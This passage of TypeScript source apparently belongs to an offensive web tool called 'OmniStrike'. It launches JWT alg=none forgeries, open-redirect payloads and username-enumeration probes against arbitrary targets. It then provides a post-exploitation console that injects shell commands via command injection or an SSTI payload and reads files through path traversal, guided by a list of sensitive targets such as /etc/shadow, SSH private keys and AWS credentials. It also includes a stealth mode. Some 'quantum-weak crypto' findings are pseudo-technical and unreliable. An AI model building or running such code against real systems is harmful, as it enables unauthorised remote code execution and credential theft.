      if (ctrl.stop) break;
      const r = await probe(`${baseUrl}${ep}`, { headers: { Authorization: `Bearer ${fakeJwt}` } });
      tested++;
      if (r.status === 200 && r.body.match(/admin|user|profile|email/i)) {
        recordFinding({ category: "JWT Vulnerability", technique: "Algorithm None Bypass", payload: `Bearer ${fakeJwt.substring(0,50)}...`, url: `${baseUrl}${ep}`, baseUrl, param: "Authorization header", statusCode: r.status, responseTime: r.time, evidence: `Server accepted JWT with 'none' algorithm at ${ep}`, severity: "critical", bypassed: true });
        await addLog(`🔴 [QBreach] JWT alg=none accepted at ${ep} — admin access granted!`);
      }
    }

    // Open Redirect → SSRF chain
    await addLog(`  🔬 Open redirect → SSRF chain attack...`);
    const redirParams = params.filter(p => /redirect|return|next|url|goto|dest|callback|r=/i.test(p));
    for (const param of redirParams.slice(0, 4)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.open_redirect.slice(0, 5)) {
        const r = await probe(`${baseUrl}?${param}=${encodeURIComponent(p)}`);
        tested++;
        const redir = r.headers["location"];
        if (redir && (redir.includes("evil.com") || redir.startsWith("//"))) {
          recordFinding({ category: "Open Redirect", technique: "URL Redirect Abuse", payload: p, url: `${baseUrl}?${param}=${encodeURIComponent(p)}`, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: `Location: ${redir}`, severity: "medium", bypassed: true });
          await addLog(`🟡 [QBreach] Open redirect to ${redir} via ?${param}`);
        }
      }
    }

    // Timing-based username enumeration
    await addLog(`  🔬 Timing side-channel username enumeration...`);
    const loginR = await probe(`${baseUrl}/login`);
    if (loginR.status === 200 || loginR.status === 401) {
      const times: Array<{ user: string; time: number }> = [];
      for (const u of PAYLOADS.timing_enum.slice(0, 6)) {
        if (ctrl.stop) break;
        const r = await probe(`${baseUrl}/login`, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `username=${u}&password=wrongpass123xyz` });
        tested++;
        times.push({ user: u, time: r.time });
      }
      const maxTime = Math.max(...times.map(t => t.time));
      const minTime = Math.min(...times.map(t => t.time));
      if (maxTime - minTime > 300) {
        const slow = times.filter(t => t.time === maxTime);
        recordFinding({ category: "Timing Side-Channel", technique: "Username Enumeration via Timing", payload: `Username: ${slow[0].user} (${maxTime}ms vs avg ${minTime}ms)`, url: `${baseUrl}/login`, baseUrl, param: "username", statusCode: loginR.status, responseTime: maxTime - minTime, evidence: `Timing delta >300ms reveals valid usernames: ${slow.map(t=>t.user).join(", ")}`, severity: "medium", bypassed: true });
        await addLog(`🟡 [QBreach] Timing side-channel: ${slow.map(t=>t.user).join(",")} responds ${maxTime-minTime}ms slower`);
      }
    }

    // Quantum-weak cryptography detection
    await addLog(`  🔬 Quantum-era weak cryptography detection...`);
    const tlsWeak = baseline.headers["server"]?.match(/apache\/2\.[01]|nginx\/1\.[0-9]\.|iis\/[678]/i);
    if (tlsWeak) {
      recordFinding({ category: "Quantum-Weak Crypto", technique: "Legacy Server — Weak Cipher Exposure", payload: `Server: ${baseline.headers["server"]}`, url: baseUrl, baseUrl, param: "Server header", statusCode: baseline.status, responseTime: baseline.time, evidence: `Legacy server version detected — likely uses ciphers vulnerable to quantum attacks (Shor's algorithm)`, severity: "medium", bypassed: false });
      await addLog(`🟡 [QBreach] Legacy server detected — quantum-weak cipher risk`);
    }
    if (baseline.headers["content-security-policy"]?.match(/unsafe-inline|unsafe-eval/)) {
      recordFinding({ category: "Quantum-Weak Crypto", technique: "Weak CSP — XSS Amplification Risk", payload: baseline.headers["content-security-policy"] ?? "", url: baseUrl, baseUrl, param: "CSP header", statusCode: baseline.status, responseTime: baseline.time, evidence: "CSP contains unsafe-inline/unsafe-eval — post-quantum attacks can amplify XSS via WASM injection", severity: "medium", bypassed: false });
      await addLog(`🟡 [QBreach] Weak CSP detected — post-quantum XSS amplification risk`);
    }

    await addLog(`✅ [QuantumBreach] Complete — advanced vectors tested`);
  }

  // ── Security Header Audit ──────────────────────────────────────────────────
  await addLog(`\n🔒 [HEADER AUDIT] Security response header analysis`);
  const secHeaders = [
    ["x-frame-options", "Clickjacking protection missing"],
    ["x-content-type-options", "MIME sniffing protection missing"],
    ["strict-transport-security", "HSTS not enforced — downgrade attack possible"],
    ["content-security-policy", "CSP absent — XSS blast radius unlimited"],
    ["referrer-policy", "Referrer leakage possible"],
    ["permissions-policy", "Browser feature policies unset"],
    ["x-xss-protection", "Legacy XSS filter disabled"],
  ];
  for (const [h, msg] of secHeaders) {
    if (!baseline.headers[h]) {
      recordFinding({ category: "Missing Security Header", technique: "Header Audit", payload: "", url: baseUrl, baseUrl, param: h, statusCode: baseline.status, responseTime: baseline.time, evidence: msg, severity: "medium", bypassed: false });
      await addLog(`🟡 [Headers] Missing: ${h} — ${msg}`);
    }
  }

  // ── Finalize ───────────────────────────────────────────────────────────────
  activeScans.delete(scanId);
  const successRate = tested > 0 ? Math.round((successCount / tested) * 100) : 0;
  const stats = {
    tested, findings: findings.length,
    critical: findings.filter(f => f.severity === "critical").length,
    high: findings.filter(f => f.severity === "high").length,
    medium: findings.filter(f => f.severity === "medium").length,
    low: findings.filter(f => f.severity === "low").length,
    successCount, successRate,
    hasRce: findings.some(f => f.canExec && f.bypassed),
    hasLfi: findings.some(f => f.canRead && f.bypassed),
    hasSession: sessions.has(scanId),
  };
  await addLog(`\n${"═".repeat(55)}`);
  await addLog(`🏁 OMNISTRIKE COMPLETE`);
  await addLog(`   Target  : ${baseUrl}`);
  await addLog(`   Tests   : ${tested}`);
  await addLog(`   Findings: ${findings.length} (${stats.critical} critical)`);
  await addLog(`   Bypass  : ${successRate}%`);
  if (stats.hasSession) await addLog(`   🔓 POST-EXPLOITATION SESSION AVAILABLE`);
  await addLog(`${"═".repeat(55)}`);

  await db.update(omnistrikeScansTable).set({
    status: ctrl.stop ? "stopped" : "completed",
    findings: findings as any, stats: stats as any, successRate, log,
    completedAt: new Date(),
  }).where(eq(omnistrikeScansTable.id, scanId));
}

// ── Scan CRUD ──────────────────────────────────────────────────────────────
router.get("/scans", async (_req, res) => {
  const scans = await db.select().from(omnistrikeScansTable).orderBy(omnistrikeScansTable.startedAt);
  res.json({ scans: scans.reverse(), total: scans.length });
});

router.post("/scan", async (req, res) => {
  const body = z.object({
    target: z.string().url(),
    categories: z.array(z.string()).default(["sqli","xss","lfi","cmdi","ssrf","xxe","ssti","headers","cors","auth","nosql","quantumbreach"]),
    threads: z.number().min(1).max(10).default(3),
    tamperLevel: z.number().min(0).max(7).default(3),
    stealthMode: z.boolean().default(false),
  }).parse(req.body);

  const [scan] = await db.insert(omnistrikeScansTable).values({
    target: body.target, status: "running", categories: body.categories,
    threads: body.threads, tamperLevel: body.tamperLevel, stealthMode: body.stealthMode,
    findings: [], log: [], startedAt: new Date(),
  }).returning();

  const ctrl = { stop: false };
  activeScans.set(scan.id, ctrl);
  runOmniStrike(scan.id, body.target, body.categories, body.tamperLevel, body.stealthMode).catch(() => {});
  res.status(201).json({ scanId: scan.id, status: "running" });
});

router.get("/scan/:id", async (req, res) => {
  const id = parseInt(req.params.id);
  const [scan] = await db.select().from(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
  if (!scan) return res.status(404).json({ error: "Scan not found" });
  const session = sessions.get(id);
  res.json({ ...scan, session: session ?? null });
});

router.post("/scan/:id/stop", async (req, res) => {
  const id = parseInt(req.params.id);
  const ctrl = activeScans.get(id);
  if (ctrl) ctrl.stop = true;
  await db.update(omnistrikeScansTable).set({ status: "stopped", completedAt: new Date() }).where(eq(omnistrikeScansTable.id, id));
  res.json({ message: "Stopped" });
});

router.delete("/scan/:id", async (req, res) => {
  const id = parseInt(req.params.id);
  const ctrl = activeScans.get(id);
  if (ctrl) ctrl.stop = true;
  activeScans.delete(id);
  sessions.delete(id);
  await db.delete(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
  res.status(204).send();
});

// ── Post-Exploitation Console ───────────────────────────────────────────────
router.get("/console/:id/session", async (req, res) => {
  const id = parseInt(req.params.id);
  const session = sessions.get(id);
  if (!session) {
    const [scan] = await db.select().from(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
    if (!scan) return res.status(404).json({ error: "Scan not found" });
    const findings = (scan.findings as Finding[]) ?? [];
    const rce = findings.find(f => f.bypassed && (f.category === "Command Injection" || f.category === "SSTI") && f.canExec);
    const lfi = findings.find(f => f.bypassed && f.category === "LFI" && f.canRead);
    if (!rce && !lfi) return res.status(404).json({ error: "No exploitable session — no confirmed RCE or LFI" });
    const active = rce ?? lfi!;
    const sess: ExploitSession = {
      scanId: id, target: scan.target,
      vector: rce ? "rce" : "lfi",
      technique: active.technique,
      baseUrl: active.baseUrl, param: active.param, workingPayload: active.payload,
      os: "linux", user: "www-data", hostname: "target", cwd: "/",
      confirmedAt: scan.startedAt.toISOString(),
    };
    sessions.set(id, sess);
    return res.json(sess);
  }
  res.json(session);
});

// Execute a shell command via the confirmed RCE vector
router.post("/console/:id/exec", async (req, res) => {
  const id = parseInt(req.params.id);
  const { command } = z.object({ command: z.string().min(1).max(500) }).parse(req.body);
  const session = sessions.get(id);
  if (!session || session.vector !== "rce") return res.status(400).json({ error: "No active RCE session for this scan" });

  // Build exploit URL with command injected
  const injectedCmd = session.technique.includes("SSTI")
    ? `{{''.__class__.__mro__[1].__subclasses__()[396]('${command.replace(/'/g,"\\'").replace(/"/g,'\\"')}',shell=True,stdout=-1).communicate()[0].decode()}}`
    : `; ${command}`;

  const exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(injectedCmd)}`;
  const r = await probe(exploitUrl);

  // Extract command output from response
  let output = r.body;
  // Strip HTML if the response is a full page
  if (output.includes("<html") || output.includes("<!DOCTYPE")) {
    output = output.replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim().substring(0, 2000);
  }

  // Update cwd if it was a cd command
  if (command.startsWith("cd ")) {
    const newDir = command.replace("cd ", "").trim();
    session.cwd = newDir.startsWith("/") ? newDir : `${session.cwd}/${newDir}`.replace("//", "/");
    sessions.set(id, session);
  }
  // Track whoami
  if (command === "whoami" && output.trim().length > 0) {
    session.user = output.trim().split("\n")[0].trim();
    sessions.set(id, session);
  }
  if (command === "hostname" && output.trim().length > 0) {
    session.hostname = output.trim().split("\n")[0].trim();
    sessions.set(id, session);
  }

  res.json({ command, output: output.substring(0, 3000), exploitUrl, statusCode: r.status, responseTime: r.time });
});

// Read a file via LFI or RCE cat
router.post("/console/:id/read", async (req, res) => {
  const id = parseInt(req.params.id);
  const { filePath } = z.object({ filePath: z.string().min(1).max(500) }).parse(req.body);
  const session = sessions.get(id);
  if (!session) return res.status(400).json({ error: "No active session" });

  let exploitUrl: string;
  let r: Awaited<ReturnType<typeof probe>>;

  if (session.vector === "rce") {
    const cmd = `cat ${filePath}`;
    exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(`; ${cmd}`)}`;
    r = await probe(exploitUrl);
  } else {
    // LFI vector — traverse to the file
    const depth = 8;
    const traversal = "../".repeat(depth);
    const cleanPath = filePath.startsWith("/") ? filePath.slice(1) : filePath;
    exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(traversal + cleanPath)}`;
    r = await probe(exploitUrl);
  }

  let content = r.body;
  if (content.includes("<html") || content.includes("<!DOCTYPE")) {
    content = content.replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim();
  }
  res.json({ filePath, content: content.substring(0, 5000), exploitUrl, statusCode: r.status, responseTime: r.time });
});

// List directory via RCE ls
router.post("/console/:id/ls", async (req, res) => {
  const id = parseInt(req.params.id);
  const { dirPath } = z.object({ dirPath: z.string().min(1).max(500) }).parse(req.body);
  const session = sessions.get(id);
  if (!session || session.vector !== "rce") {
    return res.json({ items: getLfiCuratedTree(dirPath), note: "LFI mode — curated sensitive file tree" });
  }
  const exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(`; ls -la ${dirPath}`)}`;
  const r = await probe(exploitUrl);
  const lines = r.body.split("\n").filter(l => l.trim() && !l.includes("<"));
  const items = lines.map(line => {
    const parts = line.trim().split(/\s+/);
    const perms = parts[0] ?? "";
    const name = parts[parts.length - 1] ?? line.trim();
    return { name, isDir: perms.startsWith("d"), perms, size: parts[4] ?? "", modified: parts.slice(5,8).join(" ") };
  }).filter(i => i.name && i.name !== "." && i.name !== "..");
  res.json({ dirPath, items, exploitUrl, statusCode: r.status, responseTime: r.time });
});

// LFI mode — curated tree of sensitive paths
function getLfiCuratedTree(dir: string) {
  const tree: Record<string, string[]> = {
    "/": ["etc", "var", "home", "proc", "tmp", "root", "usr"],
    "/etc": ["passwd", "shadow", "group", "hosts", "resolv.conf", "crontab", "sudoers", "os-release", "nginx", "apache2", "ssh", "mysql"],
    "/etc/nginx": ["nginx.conf", "sites-enabled", "sites-available"],
    "/etc/apache2": ["apache2.conf", "sites-enabled", "httpd.conf"],
    "/etc/ssh": ["sshd_config", "ssh_config"],
    "/etc/mysql": ["my.cnf", "mysql.conf.d"],
    "/var": ["log", "www", "mail", "backups"],
    "/var/log": ["auth.log", "syslog", "nginx", "apache2", "kern.log"],
    "/var/log/nginx": ["access.log", "error.log"],
    "/var/log/apache2": ["access.log", "error.log"],
    "/var/www": ["html", "public", "app"],
    "/var/www/html": ["index.php", ".htaccess", ".env", "config.php", "wp-config.php", "settings.php", "config.js"],
    "/home": ["www-data", "ubuntu", "admin", "user", "deploy"],
    "/home/ubuntu": [".ssh", ".bash_history", ".bashrc", ".profile", ".aws"],
    "/home/ubuntu/.ssh": ["authorized_keys", "id_rsa", "id_rsa.pub", "known_hosts"],
    "/proc": ["version", "cpuinfo", "meminfo", "net", "self"],
    "/proc/self": ["environ", "cmdline", "maps", "status"],
    "/proc/net": ["tcp", "tcp6", "udp", "if_inet6"],
    "/root": [".ssh", ".bash_history", ".bashrc", ".aws", ".env"],
    "/root/.ssh": ["authorized_keys", "id_rsa", "id_rsa.pub"],
  };
  const entries = tree[dir] ?? [];
  const knownDirs = Object.keys(tree);
  return entries.map(name => ({
    name,
    isDir: knownDirs.includes(`${dir === "/" ? "" : dir}/${name}`) || knownDirs.includes(name),
    perms: "???",
    size: "",
    modified: "",
  }));
}

export default router;
